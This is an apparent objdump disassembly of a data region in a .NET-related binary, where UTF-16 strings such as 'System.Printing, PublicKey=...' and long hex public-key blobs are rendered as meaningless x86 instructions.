  404e23:	add    BYTE PTR [eax],dh
  404e25:	add    BYTE PTR [edx],dh
  404e27:	add    BYTE PTR [eax+eax*1],dh
  404e2a:	xor    BYTE PTR [eax],al
  404e2c:	xor    BYTE PTR [eax],al
  404e2e:	xor    BYTE PTR [eax],al
  404e30:	xor    BYTE PTR [eax],al
  404e32:	xor    eax,0x35003200
  404e37:	add    BYTE PTR [ebx],dh
  404e39:	add    BYTE PTR [eax+eax*1],dh
  404e3c:	xor    DWORD PTR [eax],eax
  404e3e:	xor    eax,DWORD PTR [eax]
  404e40:	xor    DWORD PTR [eax],eax
  404e42:	xor    BYTE PTR [eax],al
  404e44:	xor    BYTE PTR [eax],al
  404e46:	xor    BYTE PTR [eax],al
  404e48:	xor    al,0x0
  404e4a:	xor    BYTE PTR [eax],al
  404e4c:	xor    BYTE PTR [eax],al
  404e4e:	xor    BYTE PTR [eax],al
  404e50:	xor    BYTE PTR [eax],al
  404e52:	xor    BYTE PTR [eax],al
  404e54:	xor    DWORD PTR [eax],eax
  404e56:	xor    BYTE PTR [eax],al
  404e58:	xor    BYTE PTR [eax],al
  404e5a:	xor    BYTE PTR [eax],al
  404e5c:	xor    DWORD PTR [eax],eax
  404e5e:	xor    BYTE PTR [eax],al
  404e60:	xor    BYTE PTR [eax],al
  404e62:	bound  eax,QWORD PTR [eax]
  404e64:	xor    eax,0x63006600
  404e69:	add    BYTE PTR [ecx],bh
  404e6b:	add    BYTE PTR [eax],dh
  404e6d:	add    BYTE PTR [ebp+0x0],ah
  404e70:	aaa    
  404e71:	add    BYTE PTR [eax],dh
  404e73:	add    BYTE PTR [edx],dh
  404e75:	add    BYTE PTR [edi],dh
  404e77:	add    BYTE PTR [esi+0x0],ah
  404e7a:	add    BYTE PTR ss:[edi],dh
  404e7d:	add    BYTE PTR [eax],bh
  404e7f:	add    BYTE PTR [edi],dh
  404e81:	add    BYTE PTR [ecx],dh
  404e83:	add    BYTE PTR [ebp+0x0],ah
  404e86:	aaa    
  404e87:	add    BYTE PTR [edi],dh
  404e89:	add    BYTE PTR [ebx],dh
  404e8b:	add    BYTE PTR [ecx+0x0],ah
  404e8e:	cmp    BYTE PTR [eax],al
  404e90:	data16 add BYTE PTR [eax+eax*1+0x65],ah
  404e95:	add    BYTE PTR [eax],bh
  404e97:	add    BYTE PTR [ecx],bh
  404e99:	add    BYTE PTR [ebx],dh
  404e9b:	add    BYTE PTR [eax],bh
  404e9d:	add    BYTE PTR [ebx+0x0],ah
  404ea0:	cmp    BYTE PTR [eax],al
  404ea2:	xor    DWORD PTR [eax],eax
  404ea4:	add    BYTE PTR fs:[eax+eax*1+0x34],ah
  404ea9:	add    BYTE PTR [eax],dh
  404eab:	add    BYTE PTR [edx],dh
  404ead:	add    BYTE PTR [edx+0x0],ah
  404eb0:	popa   
  404eb1:	add    BYTE PTR [esi],dh
  404eb3:	add    BYTE PTR ds:0x39006200,dh
  404eb9:	add    BYTE PTR [edx],dh
  404ebb:	add    BYTE PTR [eax],dh
  404ebd:	add    BYTE PTR [ecx],dh
  404ebf:	add    BYTE PTR [eax+eax*1+0x36],ah
  404ec3:	add    BYTE PTR [eax],dh
  404ec5:	add    BYTE PTR ds:0x33003900,dh
  404ecb:	add    BYTE PTR [ebp+0x0],ah
  404ece:	cmp    DWORD PTR [eax],eax
  404ed0:	add    BYTE PTR ss:[ebx+0x0],ah
  404ed4:	xor    al,0x0
  404ed6:	cmp    DWORD PTR [eax],eax
  404ed8:	xor    al,BYTE PTR [eax]
  404eda:	add    BYTE PTR ss:0x65003100,dh
  404ee1:	add    BYTE PTR [eax],bh
  404ee3:	add    BYTE PTR [eax],bh
  404ee5:	add    BYTE PTR [ecx],bh
  404ee7:	add    BYTE PTR [ebx+0x0],ah
  404eea:	arpl   WORD PTR [eax],ax
  404eec:	xor    DWORD PTR [eax],eax
  404eee:	xor    eax,DWORD PTR [eax]
  404ef0:	data16 add BYTE PTR [ecx],dh
  404ef3:	add    BYTE PTR [eax+eax*1],dh
  404ef6:	xor    DWORD PTR [eax],eax
  404ef8:	xor    eax,0x62006500
  404efd:	add    BYTE PTR [edx+0x0],ah
  404f00:	xor    eax,0x66003300
  404f05:	add    BYTE PTR [ecx+0x0],ah
  404f08:	arpl   WORD PTR [eax],ax
  404f0a:	xor    DWORD PTR [eax],eax
  404f0c:	xor    DWORD PTR [eax],eax
  404f0e:	xor    eax,DWORD PTR [eax]
  404f10:	xor    DWORD PTR [eax],eax
  404f12:	popa   
  404f13:	add    BYTE PTR [ebp+0x0],ah
  404f16:	xor    BYTE PTR [eax],al
  404f18:	bound  eax,QWORD PTR [eax]
  404f1a:	add    BYTE PTR fs:[ebx],dh
  404f1d:	add    BYTE PTR [ebx],dh
  404f1f:	add    BYTE PTR [ebx],dh
  404f21:	add    BYTE PTR [ebx+0x0],ah
  404f24:	xor    eax,0x65006500
  404f29:	add    BYTE PTR [esi],dh
  404f2b:	add    BYTE PTR [eax],dh
  404f2d:	add    BYTE PTR [edx],dh
  404f2f:	add    BYTE PTR [ecx],dh
  404f31:	add    BYTE PTR [esi],dh
  404f33:	add    BYTE PTR [edi],dh
  404f35:	add    BYTE PTR [edx],dh
  404f37:	add    BYTE PTR [eax+eax*1+0x39],ah
  404f3b:	add    BYTE PTR [edi],dh
  404f3d:	add    BYTE PTR [ecx],dh
  404f3f:	add    BYTE PTR [eax],bh
  404f41:	add    BYTE PTR [ebp+0x0],ah
  404f44:	popa   
  404f45:	add    BYTE PTR [ebx],dh
  404f47:	add    BYTE PTR [ecx],dh
  404f49:	add    BYTE PTR [ecx+0x0],ah
  404f4c:	cmp    BYTE PTR [eax],al
  404f4e:	popa   
  404f4f:	add    BYTE PTR [ebp+0x0],ah
  404f52:	bound  eax,QWORD PTR [eax]
  404f54:	add    BYTE PTR fs:[eax],dh
  404f57:	add    BYTE PTR [eax+eax*1+0x61],ah
  404f5b:	add    BYTE PTR [eax],dh
  404f5d:	add    BYTE PTR [eax],dh
  404f5f:	add    BYTE PTR [edi],dh
  404f61:	add    BYTE PTR [edx],dh
  404f63:	add    BYTE PTR [esi+0x0],ah
  404f66:	xor    al,BYTE PTR [eax]
  404f68:	xor    eax,0x38006400
  404f6d:	add    BYTE PTR [edi],dh
  404f6f:	add    BYTE PTR [eax+eax*1+0x62],ah
  404f73:	add    BYTE PTR [ecx+0x0],ah
  404f76:	add    BYTE PTR ss:[esi+0x0],ah
  404f7a:	arpl   WORD PTR [eax],ax
  404f7c:	cmp    DWORD PTR [eax],eax
  404f7e:	xor    BYTE PTR [eax],al
  404f80:	data16 add BYTE PTR [esi+0x0],ah
  404f84:	add    BYTE PTR fs:0x38003900,dh
  404f8b:	add    BYTE PTR [ebp+0x0],ah
  404f8e:	add    BYTE PTR fs:[eax+eax*1],dh
  404f92:	add    BYTE PTR fs:[ecx+0x0],ah
  404f96:	xor    eax,DWORD PTR [eax]
  404f98:	xor    eax,0x34006500
  404f9d:	add    BYTE PTR [eax+eax*1],dh
  404fa0:	arpl   WORD PTR [eax],ax
  404fa2:	xor    eax,DWORD PTR [eax]
  404fa4:	cmp    DWORD PTR [eax],eax
  404fa6:	cmp    BYTE PTR [eax],al
  404fa8:	arpl   WORD PTR [eax],ax
  404faa:	xor    al,0x0
  404fac:	xor    eax,0x33003400
  404fb1:	add    BYTE PTR [eax],dh
  404fb3:	add    BYTE PTR [edi],dh
  404fb5:	add    BYTE PTR [ebp+0x0],ah
  404fb8:	cmp    BYTE PTR [eax],al
  404fba:	add    BYTE PTR gs:[ebx],dh
  404fbd:	add    BYTE PTR [ebx],dh
  404fbf:	add    BYTE PTR [edx+0x0],ah
  404fc2:	cmp    BYTE PTR [eax],al
  404fc4:	xor    al,0x0
  404fc6:	xor    al,BYTE PTR [eax]
  404fc8:	add    BYTE PTR ss:[ecx],dh
  404fcb:	add    BYTE PTR [eax+eax*1],dh
  404fce:	xor    eax,DWORD PTR [eax]
  404fd0:	add    BYTE PTR fs:[ecx+0x0],ah
  404fd4:	add    BYTE PTR gs:[ebx+0x0],ah
  404fd8:	cmp    DWORD PTR [eax],eax
  404fda:	data16 add BYTE PTR ds:0x36003900,dh
  404fe1:	add    BYTE PTR [eax],bh
  404fe3:	add    BYTE PTR [ebx],dh
  404fe5:	add    BYTE PTR [esi],dh
  404fe7:	add    BYTE PTR [esi+0x0],ah
  404fea:	cmp    DWORD PTR [eax],eax
  404fec:	aaa    
  404fed:	add    BYTE PTR [ebx+0x0],ah
  404ff0:	cmp    BYTE PTR [eax],al
  404ff2:	data16 add BYTE PTR [edi],dh
  404ff5:	add    BYTE PTR [eax+eax*1],dh
  404ff8:	aaa    
  404ff9:	add    BYTE PTR ds:0x65003000,dh
  404fff:	add    BYTE PTR ds:0x37003900,dh
  405005:	add    BYTE PTR ds:0x36006300,dh
  40500b:	add    BYTE PTR [eax+eax*1],dh
  40500e:	add    BYTE PTR gs:[edx],dh
  405011:	add    BYTE PTR [ecx],dh
  405013:	add    BYTE PTR [eax],bh
  405015:	add    BYTE PTR [ecx],bh
  405017:	add    BYTE PTR [esi+0x0],ah
  40501a:	xor    al,0x0
  40501c:	xor    eax,0x65006400
  405021:	add    BYTE PTR [esi+0x0],ah
  405024:	xor    al,0x0
  405026:	add    BYTE PTR ss:[edx+0x0],ah
  40502a:	xor    al,BYTE PTR [eax]
  40502c:	popa   
  40502d:	add    BYTE PTR [edx],dh
  40502f:	add    BYTE PTR [edx+0x0],ah
  405032:	xor    DWORD PTR [eax],eax
  405034:	xor    al,BYTE PTR [eax]
  405036:	xor    al,0x0
  405038:	aaa    
  405039:	add    BYTE PTR [ecx+0x0],ah
  40503c:	add    BYTE PTR fs:[ebx+0x0],ah
  405040:	xor    eax,DWORD PTR [eax]
  405042:	add    BYTE PTR ss:0x62003200,dh
  405049:	add    BYTE PTR [esi+0x0],ah
  40504c:	xor    eax,0x33006300
  405051:	add    BYTE PTR [eax],dh
  405053:	add    BYTE PTR [eax],bh
  405055:	add    BYTE PTR [eax],dh
  405057:	add    BYTE PTR ds:0x64003500,dh
  40505d:	add    BYTE PTR [ecx+0x0],ah
  405060:	cmp    DWORD PTR [eax],eax
  405062:	xor    BYTE PTR [edx+edx*2+0x61006500],0x0
  40506a:	arpl   WORD PTR [eax],ax
  40506c:	push   0x72004600
  405071:	add    BYTE PTR [ecx+0x0],ah
  405074:	ins    DWORD PTR es:[edi],dx
  405075:	add    BYTE PTR [ebp+0x0],ah
  405078:	ja     0x40507a
  40507a:	outs   dx,DWORD PTR ds:[esi]
  40507b:	add    BYTE PTR [edx+0x0],dh
  40507e:	imul   eax,DWORD PTR [eax],0x2c
  405081:	add    BYTE PTR [eax],ah
  405083:	add    BYTE PTR [eax+0x0],dl
  405086:	jne    0x405088
  405088:	bound  eax,QWORD PTR [eax]
  40508a:	ins    BYTE PTR es:[edi],dx
  40508b:	add    BYTE PTR [ecx+0x0],ch
  40508e:	arpl   WORD PTR [eax],ax
  405090:	dec    ebx
  405091:	add    BYTE PTR [ebp+0x0],ah
  405094:	jns    0x405096
  405096:	cmp    eax,0x30003000
  40509b:	add    BYTE PTR [edx],dh
  40509d:	add    BYTE PTR [eax+eax*1],dh
  4050a0:	xor    BYTE PTR [eax],al
  4050a2:	xor    BYTE PTR [eax],al
  4050a4:	xor    BYTE PTR [eax],al
  4050a6:	xor    BYTE PTR [eax],al
  4050a8:	xor    BYTE PTR [eax],al
  4050aa:	xor    al,0x0
  4050ac:	cmp    BYTE PTR [eax],al
  4050ae:	xor    BYTE PTR [eax],al
  4050b0:	xor    BYTE PTR [eax],al
  4050b2:	xor    BYTE PTR [eax],al
  4050b4:	xor    BYTE PTR [eax],al
  4050b6:	xor    BYTE PTR [eax],al
  4050b8:	cmp    DWORD PTR [eax],eax
  4050ba:	xor    al,0x0
  4050bc:	xor    BYTE PTR [eax],al
  4050be:	xor    BYTE PTR [eax],al
  4050c0:	xor    BYTE PTR [eax],al
  4050c2:	xor    BYTE PTR [eax],al
  4050c4:	xor    BYTE PTR [eax],al
  4050c6:	xor    BYTE PTR [eax],al
  4050c8:	xor    BYTE PTR [eax],al
  4050ca:	add    BYTE PTR ss:[eax],dh
  4050cd:	add    BYTE PTR [edx],dh
  4050cf:	add    BYTE PTR [eax],dh
  4050d1:	add    BYTE PTR [eax],dh
  4050d3:	add    BYTE PTR [eax],dh
  4050d5:	add    BYTE PTR [eax],dh
  4050d7:	add    BYTE PTR [eax],dh
  4050d9:	add    BYTE PTR [eax],dh
  4050db:	add    BYTE PTR [edx],dh
  4050dd:	add    BYTE PTR [eax+eax*1],dh
  4050e0:	xor    BYTE PTR [eax],al
  4050e2:	xor    BYTE PTR [eax],al
  4050e4:	xor    BYTE PTR [eax],al
  4050e6:	xor    BYTE PTR [eax],al
  4050e8:	xor    eax,0x35003200
  4050ed:	add    BYTE PTR [ebx],dh
  4050ef:	add    BYTE PTR [eax+eax*1],dh
  4050f2:	xor    DWORD PTR [eax],eax
  4050f4:	xor    eax,DWORD PTR [eax]
  4050f6:	xor    DWORD PTR [eax],eax
  4050f8:	xor    BYTE PTR [eax],al
  4050fa:	xor    BYTE PTR [eax],al
  4050fc:	xor    BYTE PTR [eax],al
  4050fe:	xor    al,0x0
  405100:	xor    BYTE PTR [eax],al
  405102:	xor    BYTE PTR [eax],al
  405104:	xor    BYTE PTR [eax],al
  405106:	xor    BYTE PTR [eax],al
  405108:	xor    BYTE PTR [eax],al
  40510a:	xor    DWORD PTR [eax],eax
  40510c:	xor    BYTE PTR [eax],al
  40510e:	xor    BYTE PTR [eax],al
  405110:	xor    BYTE PTR [eax],al
  405112:	xor    DWORD PTR [eax],eax
  405114:	xor    BYTE PTR [eax],al
  405116:	xor    BYTE PTR [eax],al
  405118:	bound  eax,QWORD PTR [eax]
  40511a:	xor    eax,0x63006600
  40511f:	add    BYTE PTR [ecx],bh
  405121:	add    BYTE PTR [eax],dh
  405123:	add    BYTE PTR [ebp+0x0],ah
  405126:	aaa    
  405127:	add    BYTE PTR [eax],dh
  405129:	add    BYTE PTR [edx],dh
  40512b:	add    BYTE PTR [edi],dh
  40512d:	add    BYTE PTR [esi+0x0],ah
  405130:	add    BYTE PTR ss:[edi],dh
  405133:	add    BYTE PTR [eax],bh
  405135:	add    BYTE PTR [edi],dh
  405137:	add    BYTE PTR [ecx],dh
  405139:	add    BYTE PTR [ebp+0x0],ah
  40513c:	aaa    
  40513d:	add    BYTE PTR [edi],dh
  40513f:	add    BYTE PTR [ebx],dh
  405141:	add    BYTE PTR [ecx+0x0],ah
  405144:	cmp    BYTE PTR [eax],al
  405146:	data16 add BYTE PTR [eax+eax*1+0x65],ah
  40514b:	add    BYTE PTR [eax],bh
  40514d:	add    BYTE PTR [ecx],bh
  40514f:	add    BYTE PTR [ebx],dh
  405151:	add    BYTE PTR [eax],bh
  405153:	add    BYTE PTR [ebx+0x0],ah
  405156:	cmp    BYTE PTR [eax],al
  405158:	xor    DWORD PTR [eax],eax
  40515a:	add    BYTE PTR fs:[eax+eax*1+0x34],ah
  40515f:	add    BYTE PTR [eax],dh
  405161:	add    BYTE PTR [edx],dh
  405163:	add    BYTE PTR [edx+0x0],ah
  405166:	popa   
  405167:	add    BYTE PTR [esi],dh
  405169:	add    BYTE PTR ds:0x39006200,dh
  40516f:	add    BYTE PTR [edx],dh
  405171:	add    BYTE PTR [eax],dh
  405173:	add    BYTE PTR [ecx],dh
  405175:	add    BYTE PTR [eax+eax*1+0x36],ah
  405179:	add    BYTE PTR [eax],dh
  40517b:	add    BYTE PTR ds:0x33003900,dh
  405181:	add    BYTE PTR [ebp+0x0],ah
  405184:	cmp    DWORD PTR [eax],eax
  405186:	add    BYTE PTR ss:[ebx+0x0],ah
  40518a:	xor    al,0x0
  40518c:	cmp    DWORD PTR [eax],eax
  40518e:	xor    al,BYTE PTR [eax]
  405190:	add    BYTE PTR ss:0x65003100,dh
  405197:	add    BYTE PTR [eax],bh
  405199:	add    BYTE PTR [eax],bh
  40519b:	add    BYTE PTR [ecx],bh
  40519d:	add    BYTE PTR [ebx+0x0],ah
  4051a0:	arpl   WORD PTR [eax],ax
  4051a2:	xor    DWORD PTR [eax],eax
  4051a4:	xor    eax,DWORD PTR [eax]
  4051a6:	data16 add BYTE PTR [ecx],dh
  4051a9:	add    BYTE PTR [eax+eax*1],dh
  4051ac:	xor    DWORD PTR [eax],eax
  4051ae:	xor    eax,0x62006500
  4051b3:	add    BYTE PTR [edx+0x0],ah
  4051b6:	xor    eax,0x66003300
  4051bb:	add    BYTE PTR [ecx+0x0],ah
  4051be:	arpl   WORD PTR [eax],ax
  4051c0:	xor    DWORD PTR [eax],eax
  4051c2:	xor    DWORD PTR [eax],eax
  4051c4:	xor    eax,DWORD PTR [eax]
  4051c6:	xor    DWORD PTR [eax],eax
  4051c8:	popa   
  4051c9:	add    BYTE PTR [ebp+0x0],ah
  4051cc:	xor    BYTE PTR [eax],al
  4051ce:	bound  eax,QWORD PTR [eax]
  4051d0:	add    BYTE PTR fs:[ebx],dh
  4051d3:	add    BYTE PTR [ebx],dh
  4051d5:	add    BYTE PTR [ebx],dh
  4051d7:	add    BYTE PTR [ebx+0x0],ah
  4051da:	xor    eax,0x65006500
  4051df:	add    BYTE PTR [esi],dh
  4051e1:	add    BYTE PTR [eax],dh
  4051e3:	add    BYTE PTR [edx],dh
  4051e5:	add    BYTE PTR [ecx],dh
  4051e7:	add    BYTE PTR [esi],dh
  4051e9:	add    BYTE PTR [edi],dh
  4051eb:	add    BYTE PTR [edx],dh
  4051ed:	add    BYTE PTR [eax+eax*1+0x39],ah
  4051f1:	add    BYTE PTR [edi],dh
  4051f3:	add    BYTE PTR [ecx],dh
  4051f5:	add    BYTE PTR [eax],bh
  4051f7:	add    BYTE PTR [ebp+0x0],ah
  4051fa:	popa   
  4051fb:	add    BYTE PTR [ebx],dh
  4051fd:	add    BYTE PTR [ecx],dh
  4051ff:	add    BYTE PTR [ecx+0x0],ah
  405202:	cmp    BYTE PTR [eax],al
  405204:	popa   
  405205:	add    BYTE PTR [ebp+0x0],ah
  405208:	bound  eax,QWORD PTR [eax]
  40520a:	add    BYTE PTR fs:[eax],dh
  40520d:	add    BYTE PTR [eax+eax*1+0x61],ah
  405211:	add    BYTE PTR [eax],dh
  405213:	add    BYTE PTR [eax],dh
  405215:	add    BYTE PTR [edi],dh
  405217:	add    BYTE PTR [edx],dh
  405219:	add    BYTE PTR [esi+0x0],ah
  40521c:	xor    al,BYTE PTR [eax]
  40521e:	xor    eax,0x38006400
  405223:	add    BYTE PTR [edi],dh
  405225:	add    BYTE PTR [eax+eax*1+0x62],ah
  405229:	add    BYTE PTR [ecx+0x0],ah
  40522c:	add    BYTE PTR ss:[esi+0x0],ah
  405230:	arpl   WORD PTR [eax],ax
  405232:	cmp    DWORD PTR [eax],eax
  405234:	xor    BYTE PTR [eax],al
  405236:	data16 add BYTE PTR [esi+0x0],ah
  40523a:	add    BYTE PTR fs:0x38003900,dh
  405241:	add    BYTE PTR [ebp+0x0],ah
  405244:	add    BYTE PTR fs:[eax+eax*1],dh
  405248:	add    BYTE PTR fs:[ecx+0x0],ah
  40524c:	xor    eax,DWORD PTR [eax]
  40524e:	xor    eax,0x34006500
  405253:	add    BYTE PTR [eax+eax*1],dh
  405256:	arpl   WORD PTR [eax],ax
  405258:	xor    eax,DWORD PTR [eax]
  40525a:	cmp    DWORD PTR [eax],eax
  40525c:	cmp    BYTE PTR [eax],al
  40525e:	arpl   WORD PTR [eax],ax
  405260:	xor    al,0x0
  405262:	xor    eax,0x33003400
  405267:	add    BYTE PTR [eax],dh
  405269:	add    BYTE PTR [edi],dh
  40526b:	add    BYTE PTR [ebp+0x0],ah
  40526e:	cmp    BYTE PTR [eax],al
  405270:	add    BYTE PTR gs:[ebx],dh
  405273:	add    BYTE PTR [ebx],dh
  405275:	add    BYTE PTR [edx+0x0],ah
  405278:	cmp    BYTE PTR [eax],al
  40527a:	xor    al,0x0
  40527c:	xor    al,BYTE PTR [eax]
  40527e:	add    BYTE PTR ss:[ecx],dh
  405281:	add    BYTE PTR [eax+eax*1],dh
  405284:	xor    eax,DWORD PTR [eax]
  405286:	add    BYTE PTR fs:[ecx+0x0],ah
  40528a:	add    BYTE PTR gs:[ebx+0x0],ah
  40528e:	cmp    DWORD PTR [eax],eax
  405290:	data16 add BYTE PTR ds:0x36003900,dh
  405297:	add    BYTE PTR [eax],bh
  405299:	add    BYTE PTR [ebx],dh
  40529b:	add    BYTE PTR [esi],dh
  40529d:	add    BYTE PTR [esi+0x0],ah
  4052a0:	cmp    DWORD PTR [eax],eax
  4052a2:	aaa    
  4052a3:	add    BYTE PTR [ebx+0x0],ah
  4052a6:	cmp    BYTE PTR [eax],al
  4052a8:	data16 add BYTE PTR [edi],dh
  4052ab:	add    BYTE PTR [eax+eax*1],dh
  4052ae:	aaa    
  4052af:	add    BYTE PTR ds:0x65003000,dh
  4052b5:	add    BYTE PTR ds:0x37003900,dh
  4052bb:	add    BYTE PTR ds:0x36006300,dh
  4052c1:	add    BYTE PTR [eax+eax*1],dh
  4052c4:	add    BYTE PTR gs:[edx],dh
  4052c7:	add    BYTE PTR [ecx],dh
  4052c9:	add    BYTE PTR [eax],bh
  4052cb:	add    BYTE PTR [ecx],bh
  4052cd:	add    BYTE PTR [esi+0x0],ah
  4052d0:	xor    al,0x0
  4052d2:	xor    eax,0x65006400
  4052d7:	add    BYTE PTR [esi+0x0],ah
  4052da:	xor    al,0x0
  4052dc:	add    BYTE PTR ss:[edx+0x0],ah
  4052e0:	xor    al,BYTE PTR [eax]
  4052e2:	popa   
  4052e3:	add    BYTE PTR [edx],dh
  4052e5:	add    BYTE PTR [edx+0x0],ah
  4052e8:	xor    DWORD PTR [eax],eax
  4052ea:	xor    al,BYTE PTR [eax]
  4052ec:	xor    al,0x0
  4052ee:	aaa    
  4052ef:	add    BYTE PTR [ecx+0x0],ah
  4052f2:	add    BYTE PTR fs:[ebx+0x0],ah
  4052f6:	xor    eax,DWORD PTR [eax]
  4052f8:	add    BYTE PTR ss:0x62003200,dh
  4052ff:	add    BYTE PTR [esi+0x0],ah
  405302:	xor    eax,0x33006300
  405307:	add    BYTE PTR [eax],dh
  405309:	add    BYTE PTR [eax],bh
  40530b:	add    BYTE PTR [eax],dh
  40530d:	add    BYTE PTR ds:0x64003500,dh
  405313:	add    BYTE PTR [ecx+0x0],ah
  405316:	cmp    DWORD PTR [eax],eax
  405318:	xor    BYTE PTR [esi+0x790053],0x73
  40531f:	add    BYTE PTR [eax+eax*1+0x65],dh
  405323:	add    BYTE PTR [ebp+0x0],ch
  405326:	add    BYTE PTR cs:[eax+0x0],dl
  40532a:	jb     0x40532c
  40532c:	imul   eax,DWORD PTR [eax],0x74006e
  405332:	imul   eax,DWORD PTR [eax],0x67006e
  405338:	sub    al,0x0
  40533a:	and    BYTE PTR [eax],al
  40533c:	push   eax
  40533d:	add    BYTE PTR [ebp+0x0],dh
  405340:	bound  eax,QWORD PTR [eax]
  405342:	ins    BYTE PTR es:[edi],dx
  405343:	add    BYTE PTR [ecx+0x0],ch
  405346:	arpl   WORD PTR [eax],ax
  405348:	dec    ebx
  405349:	add    BYTE PTR [ebp+0x0],ah
  40534c:	jns    0x40534e
  40534e:	cmp    eax,0x30003000
  405353:	add    BYTE PTR [edx],dh
  405355:	add    BYTE PTR [eax+eax*1],dh
  405358:	xor    BYTE PTR [eax],al
  40535a:	xor    BYTE PTR [eax],al
  40535c:	xor    BYTE PTR [eax],al
  40535e:	xor    BYTE PTR [eax],al
  405360:	xor    BYTE PTR [eax],al
  405362:	xor    al,0x0
  405364:	cmp    BYTE PTR [eax],al
  405366:	xor    BYTE PTR [eax],al
  405368:	xor    BYTE PTR [eax],al
  40536a:	xor    BYTE PTR [eax],al
  40536c:	xor    BYTE PTR [eax],al
  40536e:	xor    BYTE PTR [eax],al
  405370:	cmp    DWORD PTR [eax],eax
  405372:	xor    al,0x0
  405374:	xor    BYTE PTR [eax],al
  405376:	xor    BYTE PTR [eax],al
  405378:	xor    BYTE PTR [eax],al
  40537a:	xor    BYTE PTR [eax],al
  40537c:	xor    BYTE PTR [eax],al
  40537e:	xor    BYTE PTR [eax],al
  405380:	xor    BYTE PTR [eax],al
  405382:	add    BYTE PTR ss:[eax],dh
  405385:	add    BYTE PTR [edx],dh
  405387:	add    BYTE PTR [eax],dh
  405389:	add    BYTE PTR [eax],dh
  40538b:	add    BYTE PTR [eax],dh
  40538d:	add    BYTE PTR [eax],dh
  40538f:	add    BYTE PTR [eax],dh
  405391:	add    BYTE PTR [eax],dh
  405393:	add    BYTE PTR [edx],dh
  405395:	add    BYTE PTR [eax+eax*1],dh
  405398:	xor    BYTE PTR [eax],al
  40539a:	xor    BYTE PTR [eax],al
  40539c:	xor    BYTE PTR [eax],al
  40539e:	xor    BYTE PTR [eax],al
  4053a0:	xor    eax,0x35003200
  4053a5:	add    BYTE PTR [ebx],dh
  4053a7:	add    BYTE PTR [eax+eax*1],dh
  4053aa:	xor    DWORD PTR [eax],eax
  4053ac:	xor    eax,DWORD PTR [eax]
  4053ae:	xor    DWORD PTR [eax],eax
  4053b0:	xor    BYTE PTR [eax],al
  4053b2:	xor    BYTE PTR [eax],al
  4053b4:	xor    BYTE PTR [eax],al
  4053b6:	xor    al,0x0
  4053b8:	xor    BYTE PTR [eax],al
  4053ba:	xor    BYTE PTR [eax],al
  4053bc:	xor    BYTE PTR [eax],al
  4053be:	xor    BYTE PTR [eax],al
  4053c0:	xor    BYTE PTR [eax],al
  4053c2:	xor    DWORD PTR [eax],eax
  4053c4:	xor    BYTE PTR [eax],al
  4053c6:	xor    BYTE PTR [eax],al
  4053c8:	xor    BYTE PTR [eax],al
  4053ca:	xor    DWORD PTR [eax],eax
  4053cc:	xor    BYTE PTR [eax],al
  4053ce:	xor    BYTE PTR [eax],al
  4053d0:	bound  eax,QWORD PTR [eax]
  4053d2:	xor    eax,0x63006600
  4053d7:	add    BYTE PTR [ecx],bh
  4053d9:	add    BYTE PTR [eax],dh
  4053db:	add    BYTE PTR [ebp+0x0],ah
  4053de:	aaa    
  4053df:	add    BYTE PTR [eax],dh
  4053e1:	add    BYTE PTR [edx],dh
  4053e3:	add    BYTE PTR [edi],dh
  4053e5:	add    BYTE PTR [esi+0x0],ah
  4053e8:	add    BYTE PTR ss:[edi],dh
  4053eb:	add    BYTE PTR [eax],bh
  4053ed:	add    BYTE PTR [edi],dh
  4053ef:	add    BYTE PTR [ecx],dh
  4053f1:	add    BYTE PTR [ebp+0x0],ah
  4053f4:	aaa    
  4053f5:	add    BYTE PTR [edi],dh
  4053f7:	add    BYTE PTR [ebx],dh
  4053f9:	add    BYTE PTR [ecx+0x0],ah
  4053fc:	cmp    BYTE PTR [eax],al
  4053fe:	data16 add BYTE PTR [eax+eax*1+0x65],ah
  405403:	add    BYTE PTR [eax],bh
  405405:	add    BYTE PTR [ecx],bh
  405407:	add    BYTE PTR [ebx],dh
  405409:	add    BYTE PTR [eax],bh
  40540b:	add    BYTE PTR [ebx+0x0],ah
  40540e:	cmp    BYTE PTR [eax],al
  405410:	xor    DWORD PTR [eax],eax
  405412:	add    BYTE PTR fs:[eax+eax*1+0x34],ah
  405417:	add    BYTE PTR [eax],dh
  405419:	add    BYTE PTR [edx],dh
  40541b:	add    BYTE PTR [edx+0x0],ah
  40541e:	popa   
  40541f:	add    BYTE PTR [esi],dh
  405421:	add    BYTE PTR ds:0x39006200,dh
  405427:	add    BYTE PTR [edx],dh
  405429:	add    BYTE PTR [eax],dh
  40542b:	add    BYTE PTR [ecx],dh
  40542d:	add    BYTE PTR [eax+eax*1+0x36],ah
  405431:	add    BYTE PTR [eax],dh
  405433:	add    BYTE PTR ds:0x33003900,dh
  405439:	add    BYTE PTR [ebp+0x0],ah
  40543c:	cmp    DWORD PTR [eax],eax
  40543e:	add    BYTE PTR ss:[ebx+0x0],ah
  405442:	xor    al,0x0
  405444:	cmp    DWORD PTR [eax],eax
  405446:	xor    al,BYTE PTR [eax]
  405448:	add    BYTE PTR ss:0x65003100,dh
  40544f:	add    BYTE PTR [eax],bh
  405451:	add    BYTE PTR [eax],bh
  405453:	add    BYTE PTR [ecx],bh
  405455:	add    BYTE PTR [ebx+0x0],ah
  405458:	arpl   WORD PTR [eax],ax
  40545a:	xor    DWORD PTR [eax],eax
  40545c:	xor    eax,DWORD PTR [eax]
  40545e:	data16 add BYTE PTR [ecx],dh
  405461:	add    BYTE PTR [eax+eax*1],dh
  405464:	xor    DWORD PTR [eax],eax
  405466:	xor    eax,0x62006500
  40546b:	add    BYTE PTR [edx+0x0],ah
  40546e:	xor    eax,0x66003300
  405473:	add    BYTE PTR [ecx+0x0],ah
  405476:	arpl   WORD PTR [eax],ax
  405478:	xor    DWORD PTR [eax],eax
  40547a:	xor    DWORD PTR [eax],eax
  40547c:	xor    eax,DWORD PTR [eax]
  40547e:	xor    DWORD PTR [eax],eax
  405480:	popa   
  405481:	add    BYTE PTR [ebp+0x0],ah
  405484:	xor    BYTE PTR [eax],al
  405486:	bound  eax,QWORD PTR [eax]
  405488:	add    BYTE PTR fs:[ebx],dh
  40548b:	add    BYTE PTR [ebx],dh
  40548d:	add    BYTE PTR [ebx],dh
  40548f:	add    BYTE PTR [ebx+0x0],ah
  405492:	xor    eax,0x65006500
  405497:	add    BYTE PTR [esi],dh
  405499:	add    BYTE PTR [eax],dh
  40549b:	add    BYTE PTR [edx],dh
  40549d:	add    BYTE PTR [ecx],dh
  40549f:	add    BYTE PTR [esi],dh
  4054a1:	add    BYTE PTR [edi],dh
  4054a3:	add    BYTE PTR [edx],dh
  4054a5:	add    BYTE PTR [eax+eax*1+0x39],ah
  4054a9:	add    BYTE PTR [edi],dh
